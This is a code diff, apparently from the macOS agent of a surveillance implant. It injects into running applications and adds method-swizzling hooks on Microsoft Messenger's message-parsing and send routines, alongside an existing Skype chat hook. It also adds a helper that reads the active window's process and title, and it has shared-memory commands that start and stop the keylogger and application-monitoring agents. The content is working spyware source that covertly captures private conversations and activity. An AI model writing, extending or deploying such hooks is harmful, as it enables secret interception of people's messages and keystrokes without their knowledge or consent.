@@ -65,6 +65,75 @@ static int clipboardFlag    = 0;
 static int voipFlag         = 0;
 static int appFlag          = 0;
 
+NSDictionary *getActiveWindowInformationForPID(pid_t pid)
+{
+  ProcessSerialNumber psn = { 0,0 };
+  NSDictionary *activeAppInfo;
+  
+  OSStatus success;
+  
+  CFArrayRef windowsList;
+  int windowPID;
+  pid_t activePid;
+  
+  NSNumber *windowID    = nil;
+  NSString *processName = nil;
+  NSString *windowName  = nil;
+  
+  // Active application on workspace
+  activeAppInfo = [[NSWorkspace sharedWorkspace] activeApplication];
+  psn.highLongOfPSN = [[activeAppInfo valueForKey: @"NSApplicationProcessSerialNumberHigh"]
+                       unsignedIntValue];
+  psn.lowLongOfPSN  = [[activeAppInfo valueForKey: @"NSApplicationProcessSerialNumberLow"]
+                       unsignedIntValue];
+  
+  // Get PID of the active Application(s)
+  if (success = GetProcessPID(&psn, &activePid) != 0)
+    return nil;
+  
+  // Window list front to back
+  windowsList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenAboveWindow,
+                                           kCGNullWindowID);
+  
+  if (windowsList == NULL)
+    return nil;
+  
+  for (NSMutableDictionary *entry in (NSArray *)windowsList)
+    {
+      windowPID = [[entry objectForKey: (id)kCGWindowOwnerPID] intValue];
+      
+      if (windowPID == pid)
+        {
+          windowID    = [NSNumber numberWithUnsignedInt:
+                         [[[entry objectForKey: (id)kCGWindowNumber] retain] unsignedIntValue]];
+          processName = [[entry objectForKey: (id)kCGWindowOwnerName] copy];
+          windowName  = [[entry objectForKey: (id)kCGWindowName] copy];
+          break;
+        }
+    }
+  CFRelease(windowsList);
+  
+  if (windowPID != pid)
+    return nil;
+  
+  NSArray *keys = [NSArray arrayWithObjects: @"windowID",
+                                             @"processName",
+                                             @"windowName",
+                                             nil];
+  NSArray *objects = [NSArray arrayWithObjects: windowID,
+                                                processName,
+                                                windowName,
+                                                nil];
+  NSDictionary *windowInfo = [[NSDictionary alloc] initWithObjects: objects
+                                                           forKeys: keys];
+  
+  [processName release];
+  [windowName release];
+  [windowID release];
+  
+  return windowInfo;
+}
+
 // OSAX Eventhandler
 OSErr InjectEventHandler(const AppleEvent *ev, AppleEvent *reply, long refcon)
 {
@@ -645,34 +714,30 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
                                     fromComponent: COMP_AGENT];
       
       if (readData != nil)
-      {
-#ifdef DEBUG
-        NSLog(@"[DYLIB] %s: command = %@", __FUNCTION__, readData);
-#endif
-        
-        shMemCommand = (shMemoryCommand *)[readData bytes];
-        
-        if (appFlag == 0
-            && shMemCommand->command == AG_START)
         {
+          shMemCommand = (shMemoryCommand *)[readData bytes];
+
+          if (appFlag == 0
+              && shMemCommand->command == AG_START)
+            {
 #ifdef DEBUG_INPUT_MANAGER
-          NSLog(@"[DYLIB] %s: Starting Agent Application", __FUNCTION__);
+              infoLog(@"Starting Agent Application");
 #endif
-          
-          appFlag = 1;
-        }
-        else if ((appFlag == 1 || appFlag == 2)
-                 && shMemCommand->command == AG_STOP)
-        {
+
+              appFlag = 1;
+            }
+          else if ((appFlag == 1 || appFlag == 2)
+                   && shMemCommand->command == AG_STOP)
+            {
 #ifdef DEBUG
-          NSLog(@"[DYLIB] %s: Stopping Agent Application", __FUNCTION__);
+              infoLog(@"Stopping Agent Application");
 #endif
-          
-          appFlag = 3;
+
+              appFlag = 3;
+            }
+
+          //[readData release];
         }
-        
-        //[readData release];
-      }
       
       readData = [mSharedMemoryCommand readMemory: OFFT_KEYLOG
                                     fromComponent: COMP_AGENT];
@@ -878,30 +943,28 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         }
       
       if (appFlag == 1)
-      {
-        appFlag = 2;
-        
-        RCSMAgentApplication *appAgent = [RCSMAgentApplication sharedInstance];
-        
-        [appAgent start];
-        
+        {
+          appFlag = 2;
+          RCSMAgentApplication *appAgent = [RCSMAgentApplication sharedInstance];
+
+          [appAgent start];
+
 #ifdef DEBUG_INPUT_MANAGER
-        NSLog(@"%s: Hooking Application", __FUNCTION__);
+          infoLog(@"Hooking Application agent");
 #endif
-        
-      }
+
+        }
       else if (appFlag == 3)
-      {
-        appFlag = 0;
-        RCSMAgentApplication *appAgent = [RCSMAgentApplication sharedInstance];
-        
-        [appAgent stop];
-        
+        {
+          appFlag = 0;
+          RCSMAgentApplication *appAgent = [RCSMAgentApplication sharedInstance];
+
+          [appAgent stop];
+
 #ifdef DEBUG_INPUT_MANAGER
-        NSLog(@"%s: Stopping Application", __FUNCTION__);
+          infoLog(@"Stopping Application agent");
 #endif
-        
-      }
+        }
       
       if (keyboardFlag == 1)
         {
@@ -1001,17 +1064,40 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
           imFlag = 2;
 #ifdef DEBUG_INPUT_MANAGER
           infoLog(@"Hooking IMs");
-#endif          
-          // In order to avoid a linker error for a missing implementation
-          Class className   = objc_getClass("SkypeChat");
-          Class classSource = objc_getClass("mySkypeChat");
-          
-          //swizzleMethod(className, @selector(isMessageRecentlyDisplayed:),
-          //              className, @selector(isMessageRecentlyDisplayedHook:));
-          
-          swizzleByAddingIMP (className, @selector(isMessageRecentlyDisplayed:),
+#endif
+
+          Class className;
+          Class classSource;
+
+          if ([bundleIdentifier isEqualToString: @"com.microsoft.Messenger"])
+            {
+              // Microsoft Messenger
+              className   = objc_getClass("IMWebViewController");
+              classSource = objc_getClass("myIMWebViewController");
+
+              swizzleByAddingIMP(className, @selector(ParseAndAppendUnicode:inLength:inStyle:fIndent:fParseEmoticons:fParseURLs:inSenderName:fLocalUser:),
+                             class_getMethodImplementation(classSource, @selector(ParseAndAppendUnicodeHook:inLength:inStyle:fIndent:fParseEmoticons:fParseURLs:inSenderName:fLocalUser:)),
+                             @selector(ParseAndAppendUnicodeHook:inLength:inStyle:fIndent:fParseEmoticons:fParseURLs:inSenderName:fLocalUser:));
+
+              className   = objc_getClass("IMWindowController");
+              classSource = objc_getClass("myIMWindowController");
+
+              swizzleByAddingIMP(className, @selector(SendMessage:cchText:inHTML:),
+                   class_getMethodImplementation(classSource, @selector(SendMessageHook:cchText:inHTML:)),
+                   @selector(SendMessageHook:cchText:inHTML:));
+
+            }
+          else
+            {
+              // Skype
+              // In order to avoid a linker error for a missing implementation
+              Class className   = objc_getClass("SkypeChat");
+              Class classSource = objc_getClass("mySkypeChat");
+
+              swizzleByAddingIMP (className, @selector(isMessageRecentlyDisplayed:),
                               class_getMethodImplementation(classSource, @selector(isMessageRecentlyDisplayedHook:)),
                               @selector(isMessageRecentlyDisplayedHook:));
+            }
         }
       else if (imFlag == 3)
         {
